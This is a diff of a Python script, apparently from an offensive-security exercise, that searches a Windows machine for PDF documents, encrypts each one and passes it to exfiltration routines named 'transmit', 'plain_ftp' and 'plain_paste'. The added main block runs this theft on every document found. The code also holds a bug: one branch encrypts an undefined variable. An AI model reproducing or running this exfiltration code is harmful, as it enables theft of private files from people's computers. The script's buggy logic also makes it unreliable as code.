@@ -25,18 +25,25 @@ def find_docs(doc_type='pdf'):
                 # if PDF, get path and yield back to caller
 
 def exfiltrate(document_path, method):
-    if method in['transmit', 'plain_ftp']:
+    if method in['transmit', 'plain_ftp']: # Pass exfil method and doc path
         filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
-        with open(document_path, 'rb') as f0:
+        with open(document_path, 'rb') as f0: # New encoded file
             content = f0.read()
         with open(filename, 'wb') as f1:
             f1.write(encrypt(content))
         
         EXFIL[method](filename)
+        # Call exfiltration funtionc w encoded file
         os.unlink(filename)
-    else:
+    else: # The other exfil methods we just read the file
         with open(document_path, 'rb') as f:
             contents = f.read()
         title = os.path.basename(document_path)
-        content =  encrypt(content)
-        EXFIL[method](title, content)
+        content =  encrypt(content) # enccrypt the contents
+        EXFIL[method](title, content) # call exfil method
+
+if __name__=='__main__':
+    for fpath in find_docs():
+        exfiltrate(fpath, 'plain_paste')
+
+# test by decripting file after succesfull atempt
